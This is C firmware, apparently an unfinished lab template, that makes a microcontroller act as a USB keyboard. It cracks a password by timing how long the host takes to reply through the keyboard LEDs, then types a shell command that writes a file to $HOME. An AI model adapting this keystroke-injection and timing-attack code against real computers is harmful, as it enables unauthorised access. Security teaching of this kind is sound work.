
#include "KeyboardHID.h"
#include "german_keyboardCodes.h"

/* Macros: */
#define LED1 P1_1
#define LED2 P1_0


/* Clock configuration */
XMC_SCU_CLOCK_CONFIG_t clock_config = {
	.syspll_config.p_div  = 2,
	.syspll_config.n_div  = 80,
	.syspll_config.k_div  = 4,
	.syspll_config.mode   = XMC_SCU_CLOCK_SYSPLL_MODE_NORMAL,
	.syspll_config.clksrc = XMC_SCU_CLOCK_SYSPLLCLKSRC_OSCHP,
	.enable_oschp         = true,
	.calibration_mode     = XMC_SCU_CLOCK_FOFI_CALIBRATION_MODE_FACTORY,
	.fsys_clksrc          = XMC_SCU_CLOCK_SYSCLKSRC_PLL,
	.fsys_clkdiv          = 1,
	.fcpu_clkdiv          = 1,
	.fccu_clkdiv          = 1,
	.fperipheral_clkdiv   = 1
};

uint32_t tick, maxTick, curTick = 0;
uint8_t done, success, validIndex, charArrayIndex = 0;
uint8_t length = 1;
uint8_t charArray [100] ={
	// modifier = 0
	GERMAN_KEYBOARD_SC_A,
	GERMAN_KEYBOARD_SC_B,
	GERMAN_KEYBOARD_SC_C,
	GERMAN_KEYBOARD_SC_D,
	GERMAN_KEYBOARD_SC_E,
	GERMAN_KEYBOARD_SC_F,
	GERMAN_KEYBOARD_SC_G,
	GERMAN_KEYBOARD_SC_H,
	GERMAN_KEYBOARD_SC_I,
	GERMAN_KEYBOARD_SC_J,
	GERMAN_KEYBOARD_SC_K,
	GERMAN_KEYBOARD_SC_L,
	GERMAN_KEYBOARD_SC_M,
	GERMAN_KEYBOARD_SC_N,
	GERMAN_KEYBOARD_SC_O,
	GERMAN_KEYBOARD_SC_P,
	GERMAN_KEYBOARD_SC_Q,
	GERMAN_KEYBOARD_SC_R,
	GERMAN_KEYBOARD_SC_S,
	GERMAN_KEYBOARD_SC_T,
	GERMAN_KEYBOARD_SC_U,
	GERMAN_KEYBOARD_SC_V,
	GERMAN_KEYBOARD_SC_W,
	GERMAN_KEYBOARD_SC_X,
	GERMAN_KEYBOARD_SC_Y,
	GERMAN_KEYBOARD_SC_Z,
	GERMAN_KEYBOARD_SC_1_AND_EXCLAMATION,
	GERMAN_KEYBOARD_SC_2_AND_QUOTES,
	GERMAN_KEYBOARD_SC_3_AND_PARAGRAPH,
	GERMAN_KEYBOARD_SC_4_AND_DOLLAR,
	GERMAN_KEYBOARD_SC_5_AND_PERCENTAGE,
	GERMAN_KEYBOARD_SC_6_AND_AMPERSAND,
	GERMAN_KEYBOARD_SC_7_AND_SLASH_AND_OPENING_BRACE,
	GERMAN_KEYBOARD_SC_8_AND_OPENING_PARENTHESIS_AND_OPENING_BRACKET,
	GERMAN_KEYBOARD_SC_9_AND_CLOSING_PARENTHESIS_AND_CLOSING_BRACKET,
	GERMAN_KEYBOARD_SC_0_AND_EQUAL_AND_CLOSING_BRACE,
	// -+,.
	GERMAN_KEYBOARD_SC_MINUS_AND_UNDERSCORE,
	GERMAN_KEYBOARD_SC_PLUS_AND_ASTERISK_AND_TILDE,
	GERMAN_KEYBOARD_SC_COMMA_AND_SEMICOLON,
	GERMAN_KEYBOARD_SC_DOT_AND_COLON,
	// modifier = shift
	GERMAN_KEYBOARD_SC_A,
	GERMAN_KEYBOARD_SC_B,
	GERMAN_KEYBOARD_SC_C,
	GERMAN_KEYBOARD_SC_D,
	GERMAN_KEYBOARD_SC_E,
	GERMAN_KEYBOARD_SC_F,
	GERMAN_KEYBOARD_SC_G,
	GERMAN_KEYBOARD_SC_H,
	GERMAN_KEYBOARD_SC_I,
	GERMAN_KEYBOARD_SC_J,
	GERMAN_KEYBOARD_SC_K,
	GERMAN_KEYBOARD_SC_L,
	GERMAN_KEYBOARD_SC_M,
	GERMAN_KEYBOARD_SC_N,
	GERMAN_KEYBOARD_SC_O,
	GERMAN_KEYBOARD_SC_P,
	GERMAN_KEYBOARD_SC_Q,
	GERMAN_KEYBOARD_SC_R,
	GERMAN_KEYBOARD_SC_S,
	GERMAN_KEYBOARD_SC_T,
	GERMAN_KEYBOARD_SC_U,
	GERMAN_KEYBOARD_SC_V,
	GERMAN_KEYBOARD_SC_W,
	GERMAN_KEYBOARD_SC_X,
	GERMAN_KEYBOARD_SC_Y,
	GERMAN_KEYBOARD_SC_Z,
	// !()_=;:>/?&$
	GERMAN_KEYBOARD_SC_1_AND_EXCLAMATION,
	GERMAN_KEYBOARD_SC_8_AND_OPENING_PARENTHESIS_AND_OPENING_BRACKET,
	GERMAN_KEYBOARD_SC_9_AND_CLOSING_PARENTHESIS_AND_CLOSING_BRACKET,
	GERMAN_KEYBOARD_SC_MINUS_AND_UNDERSCORE,
	GERMAN_KEYBOARD_SC_0_AND_EQUAL_AND_CLOSING_BRACE,
	GERMAN_KEYBOARD_SC_COMMA_AND_SEMICOLON,
	GERMAN_KEYBOARD_SC_DOT_AND_COLON,
	GERMAN_KEYBOARD_SC_LESS_THAN_AND_GREATER_THAN_AND_PIPE,
	GERMAN_KEYBOARD_SC_7_AND_SLASH_AND_OPENING_BRACE,
	GERMAN_KEYBOARD_SC_SHARP_S_AND_QUESTION_AND_BACKSLASH,
	GERMAN_KEYBOARD_SC_6_AND_AMPERSAND,
	GERMAN_KEYBOARD_SC_4_AND_DOLLAR,
	// modifier = alt
	// ~[]{}
	GERMAN_KEYBOARD_SC_PLUS_AND_ASTERISK_AND_TILDE,
	GERMAN_KEYBOARD_SC_7_AND_SLASH_AND_OPENING_BRACE,
	GERMAN_KEYBOARD_SC_8_AND_OPENING_PARENTHESIS_AND_OPENING_BRACKET,
	GERMAN_KEYBOARD_SC_9_AND_CLOSING_PARENTHESIS_AND_CLOSING_BRACKET,
	GERMAN_KEYBOARD_SC_0_AND_EQUAL_AND_CLOSING_BRACE,
};
uint8_t password [2][21] ={0, };

/* Forward declaration of HID callbacks as defined by LUFA */
bool CALLBACK_HID_Device_CreateHIDReport(
							USB_ClassInfo_HID_Device_t* const HIDInterfaceInfo,
							uint8_t* const ReportID,
							const uint8_t ReportType,
							void* ReportData,
							uint16_t* const ReportSize );

void CALLBACK_HID_Device_ProcessHIDReport(
							USB_ClassInfo_HID_Device_t* const HIDInterfaceInfo,
							const uint8_t ReportID,
							const uint8_t ReportType,
							const void* ReportData,
							const uint16_t ReportSize );

void SystemCoreClockSetup(void);
void SysTick_Handler(void);
uint8_t what_modifier(uint8_t);



/**
 * Main program entry point. This routine configures the hardware required by
 * the application, then enters a loop to run the application tasks in sequence.
 */
int main(void) {
	// Init LED pins for debugging and NUM/CAPS visual report
	XMC_GPIO_SetMode(LED1,XMC_GPIO_MODE_OUTPUT_PUSH_PULL);
	XMC_GPIO_SetMode(LED2,XMC_GPIO_MODE_OUTPUT_PUSH_PULL);
	USB_Init();

	// initialization
	// starting with a
	password[1][0] = GERMAN_KEYBOARD_SC_A;
	password[1][1] = GERMAN_KEYBOARD_SC_ENTER;
	charArrayIndex = -1;
	// temp
	SysTick_Config(SystemCoreClock / 1000);

	// Wait until host has enumerated HID device
	for(int i = 0; i < 10e6; ++i)
		; 

	while (1) {
		HID_Device_USBTask(&Keyboard_HID_Interface);
	}
}



// Callback function called when a new HID report needs to be created
bool CALLBACK_HID_Device_CreateHIDReport(
							USB_ClassInfo_HID_Device_t* const HIDInterfaceInfo,
							uint8_t* const ReportID,
							const uint8_t ReportType,
							void* ReportData,
							uint16_t* const ReportSize ) {

	USB_KeyboardReport_Data_t* report = (USB_KeyboardReport_Data_t *)ReportData;
	*ReportSize = sizeof(USB_KeyboardReport_Data_t);

	static uint8_t indexToSend, stringIndex = 0;
	static uint8_t characterSent = 0;

	// echo [your name] > $HOME/[your number]
	static uint8_t stringToSend[] = {
		// TODO
	};

	// TODO
	// check holds indices of stringToSend array element that takes right shift as a modifier
	static uint8_t check[] = {};
	static uint8_t checkIndex = 0;

	if (success){
		// create a file in $HOME directory
		// echo [your name] > $HOME/[your number]
		// TODO
		if(stringIndex < sizeOfCheck) {
			if(characterSent) {
				report->Modifier = 0; 
				report->Reserved = 0; 
				report->KeyCode[0] = 0; 
				characterSent = 0;
				stringIndex++; 
			} else {
				if (stringIndex == check[checkIndex]){
					report->Modifier = HID_KEYBOARD_MODIFIER_RIGHTSHIFT;
					checkIndex++;
				}
				else report->Modifier = 0; 
				report->Reserved = 0;
				report->KeyCode[0] = stringToSend[stringIndex]; 
				characterSent = 1;
			}
		}
	}
	else{
		// crack password
		if (done){
			done = 0;
			indexToSend = 0;
			charArrayIndex++;
			if (charArrayIndex == 83){
				// choose the right character and start guessing next one
				length++;
				password[0][length-2] = what_modifier(validIndex);
				password[1][length-2] = charArray[validIndex];
				password[0][length-1] = 0;
				password[1][length-1] = GERMAN_KEYBOARD_SC_A;
				password[0][length] = 0;
				password[1][length] = GERMAN_KEYBOARD_SC_ENTER;
				validIndex = 0;
				charArrayIndex = 0;
			}
			else{
				// for checking time over all character sets
				password[0][length-1] = what_modifier(charArrayIndex);
				password[1][length-1] = charArray[charArrayIndex];
			}
		}
		// send password
		if (indexToSend < length+1){
			if(characterSent) {
				report->Modifier = 0; 
				report->Reserved = 0; 
				report->KeyCode[0] = 0; 
				characterSent = 0;
				indexToSend++;
				if (indexToSend == length+1) tick = 0;
			}
			else {
				report->Modifier = password[0][indexToSend];
				report->Reserved = 0; 
				report->KeyCode[0] = password[1][indexToSend]; 
				characterSent = 1;
			}
		}


	}

	return true;
}



// Called on report input. For keyboard HID devices, that's the state of the LEDs
void CALLBACK_HID_Device_ProcessHIDReport(
						USB_ClassInfo_HID_Device_t* const HIDInterfaceInfo,
						const uint8_t ReportID,
						const uint8_t ReportType,
						const void* ReportData,
						const uint16_t ReportSize ) {
	uint8_t *report = (uint8_t*)ReportData;

	if(*report & HID_KEYBOARD_LED_NUMLOCK){
		done = 1;
		if (charArrayIndex < 100){
			curTick = tick;
		}
		if (maxTick < curTick){
			maxTick = curTick;
			validIndex = charArrayIndex;
		}
		XMC_GPIO_SetOutputHigh(LED1);
	}
	else 
		XMC_GPIO_SetOutputLow(LED1);

	if(*report & HID_KEYBOARD_LED_CAPSLOCK){
		XMC_GPIO_SetOutputHigh(LED2);
		success = 1;
	}
	else 
		XMC_GPIO_SetOutputLow(LED2);
}

void SystemCoreClockSetup(void) {
	/* Setup settings for USB clock */
	XMC_SCU_CLOCK_Init(&clock_config);

	XMC_SCU_CLOCK_EnableUsbPll();
	XMC_SCU_CLOCK_StartUsbPll(2, 64);
	XMC_SCU_CLOCK_SetUsbClockDivider(4);
	XMC_SCU_CLOCK_SetUsbClockSource(XMC_SCU_CLOCK_USBCLKSRC_USBPLL);
	XMC_SCU_CLOCK_EnableClock(XMC_SCU_CLOCK_USB);

	SystemCoreClockUpdate();
}

void SysTick_Handler(){
	tick++;
}

uint8_t what_modifier(uint8_t index){
	// index: 0 ~ 39 - 0
	// index: 40 ~ 77 - shift
	// index: 78 ~ 82 - alt
	if (index < 40){
		return 0;
	}
	else if (index < 78){
		return HID_KEYBOARD_MODIFIER_RIGHTSHIFT;
	}
	else if (index < 83){
		return HID_KEYBOARD_MODIFIER_RIGHTALT;
	}
	else return 0;
}


